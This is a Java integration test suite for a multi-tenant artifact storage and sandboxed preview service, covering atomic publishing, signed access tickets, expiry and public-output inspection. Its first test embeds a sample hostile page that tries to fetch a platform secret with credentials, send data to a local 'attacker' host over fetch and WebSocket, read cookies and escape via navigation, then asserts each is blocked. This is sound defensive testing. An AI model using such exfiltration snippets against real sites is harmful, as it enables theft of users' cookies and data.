package com.skillforge.institution.artifact;


import com.skillforge.runtime.api.AgentId;
import com.skillforge.runtime.api.RunOriginRef;
import com.skillforge.runtime.api.RunRequester;
import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.mock;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.skillforge.common.context.TenantContext;
import com.skillforge.core.shared.config.SnowflakeIds;
import com.skillforge.core.capability.connector.PlatformToolExecutionContext;
import com.skillforge.core.billing.persistence.PlanMapper;
import com.skillforge.core.foundation.persistence.TenantMapper;
import com.skillforge.core.foundation.application.AuditService;
import com.skillforge.institution.integration.AbstractIntegrationTest;
import com.skillforge.runtime.api.*;
import com.skillforge.runtime.api.port.*;
import java.io.*;
import java.nio.file.*;
import java.security.DigestOutputStream;
import java.time.*;
import java.util.*;
import java.util.zip.*;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.transaction.PlatformTransactionManager;

/** 真实Flyway/PostgreSQL发布边界与大文件流式读取，共用一组持久化证据。 */
class ArtifactDeliveryIntegrationTest extends AbstractIntegrationTest {
    @Autowired ArtifactMapper mapper;
    @Autowired ArtifactPublicInspection publicInspection;
    @Autowired ObjectMapper json;
    @Autowired PlatformTransactionManager manager;
    @Autowired TenantMapper tenants;
    @Autowired PlanMapper plans;
    @Autowired JdbcTemplate jdbc;
    @Autowired AuditService audit;
    @Autowired com.skillforge.core.foundation.access.FoundationAccess foundation;
    @TempDir Path root;

    @Test void realBrowserAllowsLocalScriptsButBlocksExternalRequestsAndFrameNavigation()throws Exception {
        String tenant=createTenant(tenants,plans,"preview-"+UUID.randomUUID());
        long user=SnowflakeIds.nextId(),member=SnowflakeIds.nextId();String session=Long.toString(SnowflakeIds.nextId());
        TenantContext.setTenantId(tenant);
        var preview=com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1",0),0);
        var platform=com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1",0),0);
        var attacker=com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1",0),0);
        var workers=java.util.concurrent.Executors.newVirtualThreadPerTaskExecutor();
        try {
            jdbc.update("INSERT INTO nw_end_users(id,tenant_id) VALUES(?,?)",user,Long.parseLong(tenant));
            long agent=createTestAgent(tenant,"preview");
            jdbc.update("INSERT INTO nw_chat_sessions(id,session_id,tenant_id,end_user_id,agent_id,origin_kind,actor_ref,responsibility_ref) VALUES(?,?,?,?,?,'native',?,?)",SnowflakeIds.nextId(),session,Long.parseLong(tenant),user,agent,"end_user:"+user,"tenant:"+tenant);
            jdbc.update("INSERT INTO nw_tenant_members(id,tenant_id,username,role,status) VALUES(?,?,?,'developer','active')",member,Long.parseLong(tenant),"preview-member");
            sessionReader(tenant,member,session);
            String previewOrigin="http://127.0.0.1:"+preview.getAddress().getPort();
            String platformOrigin="http://localhost:"+platform.getAddress().getPort();
            String attackerOrigin="http://127.0.0.1:"+attacker.getAddress().getPort();
            String html="""
                <!doctype html><script src="app.js"></script><button id="attack">attack</button><button id="navigate">navigate</button>
                <script>
                document.querySelector('#attack').addEventListener('click',async()=>{
                  window.blocked=0;
                  try{await fetch('PLATFORM/secret',{credentials:'include'})}catch(e){window.blocked++}
                  try{await fetch('ATTACKER/leak')}catch(e){window.blocked++}
                  try{await new Promise((resolve,reject)=>{const ws=new WebSocket('WS/leak');ws.onerror=reject;ws.onopen=resolve})}catch(e){window.blocked++}
                  window.popupBlocked=window.open('ATTACKER/popup')===null;
                  try{top.location='ATTACKER/top'}catch(e){window.blocked++}
                  const image=new Image();image.src='ATTACKER/image';
                  try{window.cookie=document.cookie}catch(e){window.cookie='blocked'}
                  window.done=true;
                });
                document.querySelector('#navigate').addEventListener('click',()=>{location.href='ATTACKER/navigation'});
                </script>
                """.replace("PLATFORM",platformOrigin).replace("ATTACKER",attackerOrigin).replace("WS",attackerOrigin.replace("http:","ws:"));
            Map<String,byte[]> content=Map.of("index.html",html.getBytes(java.nio.charset.StandardCharsets.UTF_8),"app.js","window.localScript=true;".getBytes(java.nio.charset.StandardCharsets.UTF_8));
            var archive=new ByteArrayOutputStream();var manifest=new ArrayList<ArtifactMetadata.File>();
            try(var zip=new ZipOutputStream(archive)){for(var file:content.entrySet()){zip.putNextEntry(new ZipEntry(file.getKey()));zip.write(file.getValue());zip.closeEntry();manifest.add(new ArtifactMetadata.File(file.getKey(),file.getValue().length,ArtifactStorage.hex(ArtifactStorage.hash().digest(file.getValue()))));}}
            var storage=new ArtifactStorage(mapper,json,manager,root.toString(),com.skillforge.institution.TestOperationalSettings.runs(true),org.mockito.Mockito.mock(StudioArtifactProjection.class),publicInspection);
            var artifact=storage.publish(context(tenant,session,user),manifest,new ByteArrayInputStream(archive.toByteArray()));
            String key="preview-test-signing-key-32-characters";var access=new ArtifactAccess(storage,json,audit,
                    mock(StudioArtifactProjection.class),mock(com.skillforge.core.chat.access.OpenPlatformSessionAccessService.class),foundation,key,previewOrigin,platformOrigin,platformOrigin,org.mockito.Mockito.mock(com.skillforge.core.foundation.workflowtest.WorkflowTestIsolation.class));
            var endpoint=new ArtifactPreviewServer(access,storage,org.mockito.Mockito.mock(DeliverableAccess.class),0,previewOrigin,platformOrigin,"");
            preview.createContext("/p/",endpoint::serve);preview.setExecutor(workers);preview.start();
            String ticket=ticket(json,key,new ArtifactAccess.Claim(tenant,Long.toString(member),null,artifact.id(),"preview",null,Instant.now().plusSeconds(120).getEpochSecond(),"nonce"));
            String previewUrl=previewOrigin+"/p/"+ticket+"/index.html";
            var platformReads=new java.util.concurrent.atomic.AtomicInteger();var externalReads=new java.util.concurrent.atomic.AtomicInteger();
            platform.createContext("/",exchange->{
                if(exchange.getRequestURI().getPath().equals("/secret"))platformReads.incrementAndGet();
                byte[] page=("<!doctype html><meta http-equiv=\"Content-Security-Policy\" content=\"frame-src "+previewOrigin+"\"><iframe sandbox=\"allow-scripts\" referrerpolicy=\"no-referrer\" src=\""+previewUrl+"\"></iframe>").getBytes(java.nio.charset.StandardCharsets.UTF_8);
                exchange.getResponseHeaders().set("Content-Type","text/html");exchange.sendResponseHeaders(200,page.length);exchange.getResponseBody().write(page);exchange.close();
            });platform.setExecutor(workers);platform.start();
            attacker.createContext("/",exchange->{externalReads.incrementAndGet();exchange.sendResponseHeaders(204,-1);exchange.close();});attacker.setExecutor(workers);attacker.start();
            String browserScript="""
                const {chromium}=require('@playwright/test');
                (async()=>{const browser=await chromium.launch({headless:true});try{
                  const page=await browser.newPage();await page.goto(process.argv[1]);
                  const frame=page.frameLocator('iframe');await frame.locator('#attack').waitFor();
                  if(!await frame.locator('body').evaluate(()=>window.localScript))throw Error('local script blocked');
                  await frame.locator('#attack').click();await frame.locator('body').evaluate(()=>new Promise(resolve=>{const poll=()=>window.done?resolve():setTimeout(poll,10);poll()}));
                  const facts=await frame.locator('body').evaluate(()=>({blocked:window.blocked,popup:window.popupBlocked,cookie:window.cookie}));
                  if(facts.blocked<4||!facts.popup||facts.cookie!=='blocked')throw Error('isolation failed '+JSON.stringify(facts));
                  await frame.locator('#navigate').click();await page.waitForLoadState('networkidle');
                  if(page.url()!==process.argv[1]+'/')throw Error('top navigation escaped');
                  if((await page.context().pages()).length!==1)throw Error('popup escaped');
                }finally{await browser.close()}})().catch(e=>{console.error(e.message);process.exit(1)});
                """;
            Path repo=Path.of("").toAbsolutePath();while(repo!=null&&!Files.isDirectory(repo.resolve("frontend-admin")))repo=repo.getParent();assertNotNull(repo);
            Process browser=new ProcessBuilder("node","-e",browserScript,platformOrigin).directory(repo.resolve("frontend-admin").toFile()).redirectErrorStream(true).start();
            try{assertTrue(browser.waitFor(45,java.util.concurrent.TimeUnit.SECONDS),"browser timeout");String diagnostic=new String(browser.getInputStream().readAllBytes(),java.nio.charset.StandardCharsets.UTF_8);assertEquals(0,browser.exitValue(),diagnostic);}
            finally{if(browser.isAlive()){browser.destroyForcibly();browser.waitFor();}}
            assertEquals(0,platformReads.get());assertEquals(0,externalReads.get());
            var http=java.net.http.HttpClient.newHttpClient();
            var response=http.send(java.net.http.HttpRequest.newBuilder(java.net.URI.create(previewUrl)).build(),java.net.http.HttpResponse.BodyHandlers.discarding());
            assertEquals(200,response.statusCode());
            String csp=response.headers().firstValue("Content-Security-Policy").orElseThrow();
            String scriptPolicy=Arrays.stream(csp.split(";")).map(String::trim)
                    .filter(value->value.startsWith("script-src ")).findFirst().orElseThrow();
            assertTrue(scriptPolicy.contains("'sha256-"));
            assertFalse(scriptPolicy.contains("'unsafe-inline'"));
            assertFalse(scriptPolicy.contains("'unsafe-eval'"));
            assertTrue(csp.contains("script-src-attr 'none'"));
            assertTrue(csp.contains("sandbox allow-scripts"));
            assertEquals("nosniff",response.headers().firstValue("X-Content-Type-Options").orElseThrow());
            jdbc.update("UPDATE nw_tenant_members SET status='disabled' WHERE id=?",member);
            assertEquals(404,http.send(java.net.http.HttpRequest.newBuilder(java.net.URI.create(previewUrl)).build(),java.net.http.HttpResponse.BodyHandlers.discarding()).statusCode());
        }finally{preview.stop(0);platform.stop(0);attacker.stop(0);workers.close();TenantContext.clear();}
    }

    @Test void databasePublicationFailureLeavesNoReadableArtifactAndOrphanIsReclaimed()throws Exception {
        String missingTenant="999999999999";TenantContext.setTenantId(missingTenant);
        try {
            var storage=new ArtifactStorage(mapper,json,manager,root.toString(),com.skillforge.institution.TestOperationalSettings.runs(true),org.mockito.Mockito.mock(StudioArtifactProjection.class),publicInspection);
            byte[] bytes="complete file".getBytes(java.nio.charset.StandardCharsets.UTF_8);
            var file=new ArtifactMetadata.File("file.txt",bytes.length,ArtifactStorage.hex(ArtifactStorage.hash().digest(bytes)));
            var archive=new ByteArrayOutputStream();try(var zip=new ZipOutputStream(archive)){zip.putNextEntry(new ZipEntry("file.txt"));zip.write(bytes);zip.closeEntry();}
            var context=context(missingTenant,"session",1);
            assertThrows(RuntimeException.class,()->storage.publish(context,List.of(file),new ByteArrayInputStream(archive.toByteArray())));
            assertNull(mapper.invocation(missingTenant,context.invocationId()));
            Path orphan;try(var paths=Files.list(root.resolve("ready").resolve(missingTenant))){orphan=paths.findFirst().orElseThrow();}
            assertThrows(RuntimeException.class,()->storage.require(missingTenant,orphan.getFileName().toString()));
            Files.setLastModifiedTime(orphan,java.nio.file.attribute.FileTime.from(Instant.now().minus(Duration.ofDays(2))));
            storage.cleanupOrphans(missingTenant);assertFalse(Files.exists(orphan));
        }finally{TenantContext.clear();}
    }

    @Test void publishesLargeFileAtomicallyAndChecksCurrentAccessOnEveryTicketRead()throws Exception {
        String tenant=createTenant(tenants,plans,"artifact-"+UUID.randomUUID());
        long user=SnowflakeIds.nextId(),member=SnowflakeIds.nextId();String session=Long.toString(SnowflakeIds.nextId());
        TenantContext.setTenantId(tenant);
        try {
            jdbc.update("INSERT INTO nw_end_users(id,tenant_id) VALUES(?,?)",user,Long.parseLong(tenant));
            long agent=createTestAgent(tenant,"artifact");
            jdbc.update("INSERT INTO nw_chat_sessions(id,session_id,tenant_id,end_user_id,agent_id,origin_kind,actor_ref,responsibility_ref) VALUES(?,?,?,?,?,'native',?,?)",SnowflakeIds.nextId(),session,Long.parseLong(tenant),user,agent,"end_user:"+user,"tenant:"+tenant);
            jdbc.update("INSERT INTO nw_tenant_members(id,tenant_id,username,role,status) VALUES(?,?,?,'developer','active')",member,Long.parseLong(tenant),"artifact-member");
            sessionReader(tenant,member,session);
            var storage=new ArtifactStorage(mapper,json,manager,root.toString(),com.skillforge.institution.TestOperationalSettings.runs(true),org.mockito.Mockito.mock(StudioArtifactProjection.class),publicInspection);
            var context=context(tenant,session,user);
            byte[] block=new byte[64*1024];new Random(7).nextBytes(block);
            var hash=ArtifactStorage.hash();Path zip=root.resolve("transport.zip");
            // 大文件流式传输采用有效媒体；未知二进制不能取得公开检查凭据。
            int audioBytes=352*block.length;
            byte[] header=java.nio.ByteBuffer.allocate(44).order(java.nio.ByteOrder.LITTLE_ENDIAN)
                    .put("RIFF".getBytes(java.nio.charset.StandardCharsets.US_ASCII)).putInt(36+audioBytes)
                    .put("WAVEfmt ".getBytes(java.nio.charset.StandardCharsets.US_ASCII)).putInt(16)
                    .putShort((short)1).putShort((short)2).putInt(44100).putInt(176400).putShort((short)4).putShort((short)16)
                    .put("data".getBytes(java.nio.charset.StandardCharsets.US_ASCII)).putInt(audioBytes).array();
            try(var output=new ZipOutputStream(Files.newOutputStream(zip))) {
                output.putNextEntry(new ZipEntry("report.wav"));output.write(header);hash.update(header);
                for(int i=0;i<352;i++){output.write(block);hash.update(block);}output.closeEntry();
            }
            var file=new ArtifactMetadata.File("report.wav",header.length+352L*block.length,ArtifactStorage.hex(hash.digest()));
            ArtifactMetadata result;
            try(var input=Files.newInputStream(zip)){result=storage.publish(context,List.of(file),input);}
            assertEquals("ready",result.status());assertTrue(result.size()>20*1024*1024);
            assertEquals(result,storage.list(tenant,session).getFirst());
            try(var input=Files.newInputStream(zip)){assertEquals(result.id(),storage.publish(context,List.of(file),input).id());}
            var row=storage.require(tenant,result.id());var downloaded=ArtifactStorage.hash();
            storage.file(row,"report.wav",new DigestOutputStream(OutputStream.nullOutputStream(),downloaded));
            assertEquals(file.sha256(),ArtifactStorage.hex(downloaded.digest()));
            Path delivery=root.resolve("download.zip");try(var output=Files.newOutputStream(delivery)){storage.zip(row,output);}
            try(var zipped=new ZipInputStream(Files.newInputStream(delivery))) {
                assertEquals("report.wav",zipped.getNextEntry().getName());var zipHash=ArtifactStorage.hash();zipped.transferTo(new DigestOutputStream(OutputStream.nullOutputStream(),zipHash));assertEquals(file.sha256(),ArtifactStorage.hex(zipHash.digest()));assertNull(zipped.getNextEntry());
            }
            String key="artifact-test-signing-key-32-characters";
            var access=new ArtifactAccess(storage,json,audit,mock(StudioArtifactProjection.class),mock(com.skillforge.core.chat.access.OpenPlatformSessionAccessService.class),foundation,key,
                    "http://preview.localhost:8091","http://localhost:5173","http://localhost:5173",org.mockito.Mockito.mock(com.skillforge.core.foundation.workflowtest.WorkflowTestIsolation.class));
            String ticket=ticket(json,key,new ArtifactAccess.Claim(tenant,Long.toString(member),null,result.id(),"file","report.wav",Instant.now().plusSeconds(120).getEpochSecond(),"nonce"));
            assertEquals(result.id(),access.verify(ticket,"file").row().id());
            assertThrows(RuntimeException.class,()->access.verify(ticket,"preview"));
            var otherSession=createSession(tenant,"other-artifact-reader");long otherMember=SnowflakeIds.nextId();
            jdbc.update("INSERT INTO nw_tenant_members(id,tenant_id,username,role,status) VALUES(?,?,?,'developer','active')",otherMember,Long.parseLong(tenant),"other-artifact-member");sessionReader(tenant,otherMember,otherSession.session());
            String foreignTicket=ticket(json,key,new ArtifactAccess.Claim(tenant,Long.toString(otherMember),null,result.id(),"file","report.wav",Instant.now().plusSeconds(120).getEpochSecond(),"other-nonce"));
            assertThrows(RuntimeException.class,()->access.verify(foreignTicket,"file"));
            jdbc.update("DELETE FROM nw_foundation_role_permissions WHERE scope_key=? AND permission_code='foundation.sessions.read' AND role_id IN (SELECT role_id FROM nw_foundation_member_roles WHERE scope_key=? AND member_id=?)",tenant,tenant,member);
            assertThrows(RuntimeException.class,()->access.verify(ticket,"file"));
            jdbc.update("INSERT INTO nw_foundation_role_permissions(scope_key,role_id,permission_code) SELECT scope_key,role_id,'foundation.sessions.read' FROM nw_foundation_member_roles WHERE scope_key=? AND member_id=?",tenant,member);
            assertEquals(result.id(),access.verify(ticket,"file").row().id());
            jdbc.update("UPDATE nw_tenant_members SET status='disabled' WHERE id=?",member);
            assertThrows(RuntimeException.class,()->access.verify(ticket,"file"));
            assertThrows(RuntimeException.class,()->foundation.requireSession(new com.skillforge.core.foundation.access.FoundationAccess.Subject(false,tenant,Long.toString(member)),session,"read"));
            assertThrows(RuntimeException.class,()->storage.require("999999",result.id()));
            jdbc.update("UPDATE nw_execution_artifact_files SET expires_at=now()-interval '1 second' WHERE artifact_id=?",result.id());
            assertThrows(RuntimeException.class,()->storage.require(tenant,result.id()));
            assertEquals("expired",storage.list(tenant,session).getFirst().status());storage.cleanup(tenant);
            assertFalse(Files.exists(root.resolve("ready").resolve(tenant).resolve(result.id()).resolve("report.wav")));
            assertEquals("deleted",jdbc.queryForObject("SELECT status FROM nw_execution_artifact_files WHERE artifact_id=?",String.class,result.id()));

            var badContext=context(tenant,session,user);
            var badFile=new ArtifactMetadata.File("report.wav",file.size(),"0".repeat(64));
            try(var input=Files.newInputStream(zip)){assertThrows(IOException.class,()->storage.publish(badContext,List.of(badFile),input));}
            assertNull(mapper.invocation(tenant,badContext.invocationId()));
            assertThrows(IllegalArgumentException.class,()->ArtifactStorage.safePath("../escape"));
            assertThrows(IOException.class,()->storage.publish(badContext,Collections.nCopies(257,file),InputStream.nullInputStream()));
        }finally{TenantContext.clear();}
    }
    @Test void publishesExplicitMultiParentGraphAtomicallyAndRejectsChangedReplay()throws Exception {
        String tenant=createTenant(tenants,plans,"artifact-graph-"+UUID.randomUUID());
        long user=SnowflakeIds.nextId();String session=Long.toString(SnowflakeIds.nextId());
        TenantContext.setTenantId(tenant);
        try {
            jdbc.update("INSERT INTO nw_end_users(id,tenant_id) VALUES(?,?)",user,Long.parseLong(tenant));
            long agent=createTestAgent(tenant,"artifact-graph");
            jdbc.update("INSERT INTO nw_chat_sessions(id,session_id,tenant_id,end_user_id,agent_id,origin_kind,actor_ref,responsibility_ref) VALUES(?,?,?,?,?,'native',?,?)",
                    SnowflakeIds.nextId(),session,Long.parseLong(tenant),user,agent,"end_user:"+user,"tenant:"+tenant);
            var storage=new ArtifactStorage(mapper,json,manager,root.toString(),com.skillforge.institution.TestOperationalSettings.runs(true),org.mockito.Mockito.mock(StudioArtifactProjection.class),publicInspection);
            ArtifactMetadata first=publishText(storage,context(tenant,session,user),"first.txt","first",List.of());
            ArtifactMetadata second=publishText(storage,context(tenant,session,user),"second.txt","second",List.of());
            var provenance=List.of(
                    new ArtifactProvenance(second.id(),"second.txt",6,second.files().getFirst().sha256()),
                    new ArtifactProvenance(first.id(),"first.txt",5,first.files().getFirst().sha256()));
            var childContext=context(tenant,session,user);
            ArtifactMetadata child=publishText(storage,childContext,"child.txt","child",provenance);

            var expectedParents=java.util.stream.Stream.of(first.id(),second.id()).sorted().toList();
            assertEquals(expectedParents,child.artifactInputs().stream()
                    .map(ArtifactProvenance::artifactId).toList());
            assertEquals(2,queryCount(jdbc,tenant,
                    "SELECT count(*) FROM nw_execution_artifact_inputs WHERE artifact_id=?",child.id()));
            assertThrows(IllegalStateException.class,()->publishText(storage,childContext,"child.txt","child",
                    List.of(new ArtifactProvenance(first.id(),"first.txt",5,first.files().getFirst().sha256()))));

            jdbc.update("UPDATE nw_execution_artifact_files SET expires_at=now()-interval '1 second' WHERE artifact_id=?",first.id());
            var downloaded=new ByteArrayOutputStream();
            storage.file(storage.require(tenant,child.id()),"child.txt",downloaded);
            assertEquals("child",downloaded.toString(java.nio.charset.StandardCharsets.UTF_8));
            assertEquals(expectedParents,storage.list(tenant,session).stream()
                    .filter(item->item.id().equals(child.id())).findFirst().orElseThrow().artifactInputs().stream()
                    .map(ArtifactProvenance::artifactId).toList());
        } finally {TenantContext.clear();}
    }

    @Test void rejectedFirstInspectionNeverMovesToReadyOrRegistersPublicMetadata() throws Exception {
        String tenant=createTenant(tenants,plans,"private-artifact-"+UUID.randomUUID());
        TenantContext.setTenantId(tenant);
        try {
            var session=createSession(tenant,"private-artifact");
            var inspection=new ArtifactPublicInspection(new com.skillforge.core.chat.integration.publicread.PublicOutputGuard(root.toString()));
            var storage=new ArtifactStorage(mapper,json,manager,root.toString(),
                    com.skillforge.institution.TestOperationalSettings.runs(true),mock(StudioArtifactProjection.class),inspection);
            var context=context(tenant,session.session(),session.user());
            var rejected=assertThrows(ArtifactPublicInspection.Rejection.class,
                    ()->publishText(storage,context,"report.md","宿主私有路径 "+root.toAbsolutePath(),List.of()));
            assertEquals("PUBLIC_OUTPUT_REJECTED",rejected.getMessage());
            assertNull(mapper.invocation(tenant,context.invocationId()));
            assertEquals(List.of(),storage.list(tenant,session.session()));
            assertEquals(0,queryCount(jdbc,tenant,"SELECT count(*) FROM nw_execution_artifact_public_inspections"));
            try(var ready=Files.list(root.resolve("ready").resolve(tenant))) { assertEquals(0,ready.count()); }
            try(var staging=Files.list(root.resolve("staging"))) { assertEquals(0,staging.count()); }
        } finally {TenantContext.clear();}
    }

    @Test void immutableInspectionBindsActualBytesAndUncheckedFilesAreDeniedEverywhere() throws Exception {
        String tenant=createTenant(tenants,plans,"inspection-record-"+UUID.randomUUID());
        String otherTenant=createTenant(tenants,plans,"inspection-other-"+UUID.randomUUID());
        TenantContext.setTenantId(tenant);
        try {
            var session=createSession(tenant,"inspection-record");
            long member=SnowflakeIds.nextId();
            jdbc.update("INSERT INTO nw_tenant_members(id,tenant_id,username,role,status) VALUES(?,?,?,'developer','active')",
                    member,Long.parseLong(tenant),"inspection-member");
            sessionReader(tenant,member,session.session());
            var storage=new ArtifactStorage(mapper,json,manager,root.toString(),
                    com.skillforge.institution.TestOperationalSettings.runs(true),mock(StudioArtifactProjection.class),publicInspection);
            var context=context(tenant,session.session(),session.user());
            var artifact=publishText(storage,context,"order.json","{\"artifact_id\":\"business-order-20260930\"}",List.of());
            var file=artifact.files().getFirst();
            String digest=jdbc.queryForObject("SELECT scope_digest FROM nw_execution_artifact_public_inspections WHERE artifact_id=?",String.class,artifact.id());
            assertTrue(mapper.inspected(tenant,artifact.id(),file.path(),file.sha256(),file.size(),digest,ArtifactPublicInspection.POLICY_VERSION));
            assertFalse(mapper.inspected(tenant,artifact.id(),file.path(),"0".repeat(64),file.size(),digest,ArtifactPublicInspection.POLICY_VERSION));
            assertFalse(mapper.inspected(tenant,artifact.id(),file.path(),file.sha256(),file.size(),digest,"previous-policy"));
            String reader="inspection_reader_"+UUID.randomUUID().toString().replace("-","");
            jdbc.execute("CREATE ROLE "+reader+" NOLOGIN NOSUPERUSER NOBYPASSRLS");
            jdbc.execute("GRANT SELECT ON nw_execution_artifact_public_inspections TO "+reader);
            try {
                new org.springframework.transaction.support.TransactionTemplate(manager).executeWithoutResult(status->{
                    jdbc.execute("SET LOCAL ROLE "+reader);
                    assertEquals(0,queryCount(jdbc,otherTenant,"SELECT count(*) FROM nw_execution_artifact_public_inspections"));
                    assertEquals(1,queryCount(jdbc,tenant,"SELECT count(*) FROM nw_execution_artifact_public_inspections"));
                });
            } finally {
                jdbc.execute("REVOKE ALL ON nw_execution_artifact_public_inspections FROM "+reader);
                jdbc.execute("DROP ROLE "+reader);
            }
            assertThrows(org.springframework.dao.DataAccessException.class,()->jdbc.update(
                    "UPDATE nw_execution_artifact_public_inspections SET policy_version='rewritten' WHERE artifact_id=?",artifact.id()));
            var row=storage.require(tenant,artifact.id());
            String key="inspection-test-signing-key-32-characters";
            var access=new ArtifactAccess(storage,json,audit,mock(StudioArtifactProjection.class),mock(com.skillforge.core.chat.access.OpenPlatformSessionAccessService.class),foundation,key,
                    "http://preview.localhost:8091","http://localhost:5173","http://localhost:5173",org.mockito.Mockito.mock(com.skillforge.core.foundation.workflowtest.WorkflowTestIsolation.class));
            String ticket=ticket(json,key,new ArtifactAccess.Claim(tenant,Long.toString(member),null,artifact.id(),
                    "file","order.json",Instant.now().plusSeconds(120).getEpochSecond(),"nonce"));
            assertEquals(artifact.id(),access.verify(ticket,"file").row().id());
            // 删除只模拟缺失凭据；不对存量文件补写“通过”，所有公开入口同时失去可读性。
            jdbc.update("DELETE FROM nw_execution_artifact_public_inspections WHERE artifact_id=?",artifact.id());
            assertEquals(List.of(),storage.list(tenant,session.session()));
            assertThrows(RuntimeException.class,()->storage.require(tenant,artifact.id()));
            assertThrows(RuntimeException.class,()->storage.file(row,"order.json",OutputStream.nullOutputStream()));
            assertThrows(RuntimeException.class,()->access.verify(ticket,"file"));
            assertThrows(ArtifactPublicInspection.Rejection.class,()->publishText(storage,context,"order.json",
                    "{\"artifact_id\":\"business-order-20260930\"}",List.of()));
        } finally {TenantContext.clear();}
    }

    /** 测试授权使用正式角色关系及Session自身所有权，不以旧role或Agent授权兜底。 */
    private void sessionReader(String tenant,long member,String session) {
        long role=SnowflakeIds.nextId();
        jdbc.update("INSERT INTO nw_foundation_access_scopes(scope_key,tenant_id) VALUES(?,?) ON CONFLICT DO NOTHING",tenant,Long.parseLong(tenant));
        jdbc.update("INSERT INTO nw_foundation_member_profiles(scope_key,member_id,display_name) VALUES(?,?,'Artifact reader')",tenant,member);
        jdbc.update("INSERT INTO nw_foundation_roles(id,scope_key,code,name,data_scope) VALUES(?,?,?,'Artifact reader','self')",role,tenant,"artifact_reader_"+role);
        jdbc.update("INSERT INTO nw_foundation_role_permissions(scope_key,role_id,permission_code) VALUES(?,?,'foundation.sessions.read')",tenant,role);
        jdbc.update("INSERT INTO nw_foundation_member_roles(scope_key,member_id,role_id) VALUES(?,?,?)",tenant,member,role);
        jdbc.update("INSERT INTO nw_foundation_resource_ownership(scope_key,kind,resource_id,owner_member_id) SELECT ?,'session',id,? FROM nw_chat_sessions WHERE tenant_id=? AND session_id=?",tenant,member,Long.parseLong(tenant),session);
    }

    private SessionFixture createSession(String tenant,String purpose) {
        long user=SnowflakeIds.nextId();String session=Long.toString(SnowflakeIds.nextId());
        jdbc.update("INSERT INTO nw_end_users(id,tenant_id) VALUES(?,?)",user,Long.parseLong(tenant));
        long agent=createTestAgent(tenant,purpose);
        jdbc.update("INSERT INTO nw_chat_sessions(id,session_id,tenant_id,end_user_id,agent_id,origin_kind,actor_ref,responsibility_ref) VALUES(?,?,?,?,?,'native',?,?)",
                SnowflakeIds.nextId(),session,Long.parseLong(tenant),user,agent,"end_user:"+user,"tenant:"+tenant);
        return new SessionFixture(session,user);
    }
    private record SessionFixture(String session,long user) { }

    private long createTestAgent(String tenant,String purpose) {
        long id=SnowflakeIds.nextId();
        jdbc.update("INSERT INTO nw_agents(id,agent_key,tenant_id,name,status,published_at) VALUES(?,?,?,?,'published',now())",
                id,"artifact-test-"+id,Long.parseLong(tenant),purpose+" test agent");
        return id;
    }
    private ArtifactMetadata publishText(ArtifactStorage storage,PlatformToolExecutionContext context,
            String path,String content,List<ArtifactProvenance> inputs)throws Exception {
        byte[] bytes=content.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        var file=new ArtifactMetadata.File(path,bytes.length,ArtifactStorage.hex(ArtifactStorage.hash().digest(bytes)));
        var archive=new ByteArrayOutputStream();
        try(var zip=new ZipOutputStream(archive)){zip.putNextEntry(new ZipEntry(path));zip.write(bytes);zip.closeEntry();}
        return storage.publish(context,List.of(file),inputs,new ByteArrayInputStream(archive.toByteArray()));
    }
    static PlatformToolExecutionContext context(String tenant,String session,long user) {
        var input=new InputId("input-"+UUID.randomUUID());var tenantId=new TenantId(tenant);
        var owner=SessionOwner.user(new SessionRef(tenantId,session),new AgentId("agent"),new EndUserId(user));
        var run=new RunIdentity(owner, new AgentId((owner).target().id()), input, new RunRef(tenantId,"run-"+UUID.randomUUID()), new TraceEnvelope("trace","span",input,Optional.empty()), new ResultRef("identity"), new RunRequester.EndUser((owner).requireUser()), java.util.Optional.empty(), new RunOriginRef((owner).sessionRef().tenantId(), "input:" + (input).value()));
        var identity = new VerifiedIdentity(new PrincipalRef.EndUserPrincipal(tenantId, owner.requireUser()), owner,
                Set.of(), 1, new ResultRef("verification"));
        return new PlatformToolExecutionContext(
                new PortCallContext(run, identity, new InvocationControl(Instant.now().plusSeconds(180), () -> false)),
                "invocation-" + UUID.randomUUID(), "attempt");
    }
    static String ticket(ObjectMapper json,String key,ArtifactAccess.Claim claim)throws Exception {
        String body=Base64.getUrlEncoder().withoutPadding().encodeToString(json.writeValueAsBytes(claim));var mac=Mac.getInstance("HmacSHA256");mac.init(new SecretKeySpec(key.getBytes(java.nio.charset.StandardCharsets.UTF_8),"HmacSHA256"));
        return body+"."+Base64.getUrlEncoder().withoutPadding().encodeToString(mac.doFinal(body.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
    }
}
